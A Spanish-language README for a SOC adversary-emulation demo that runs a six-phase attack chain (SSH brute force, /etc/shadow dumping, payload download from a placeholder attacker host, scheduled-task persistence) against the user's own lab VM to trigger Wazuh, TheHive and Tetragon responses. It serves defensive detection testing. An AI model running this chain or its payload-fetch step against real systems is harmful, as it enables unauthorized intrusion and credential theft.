# Emulación de adversario (demo del SOC)

Scripts para **validar la detección y respuesta** del SOC contra tu propia VM víctima de laboratorio.

## ⚠️ Uso responsable
Solo en una **red aislada**, contra **tus propias máquinas** y con autorización. El objetivo es generar alertas para probar el pipeline, no atacar sistemas reales.

## Ficheros
- `attack-demo.sh` — ejecuta la cadena de 6 fases (T1110 → T1059 → descubrimiento → T1003 → T1105 → T1053) con pausas entre pasos.
- `payload.sh` — payload **simulado e inofensivo** (solo deja una marca con la fecha).

## Antes de ejecutar
1. Rellena las variables del script (o pásalas por entorno):
   ```bash
   TARGET=<ip-victima> SSH_USER=<usuario> WORDLIST=./wordlist.txt \
   PAYLOAD_URL=http://<ip-atacante>/payload.sh ./attack-demo.sh
   ```
2. El **diccionario** (`wordlist.txt`, p.ej. rockyou) **no se incluye** en el repo: aporta el tuyo.
3. La fase 4 (`/etc/shadow`) es la que cruza el umbral y dispara el SOAR completo.

## Resultado esperado
Alertas en **Wazuh** → workflow en **Shuffle** → caso en **TheHive** → tarjeta en **Discord** con el análisis de la IA. Si la TracingPolicy de Tetragon está activa, el proceso de la fase 4 se termina con SIGKILL.
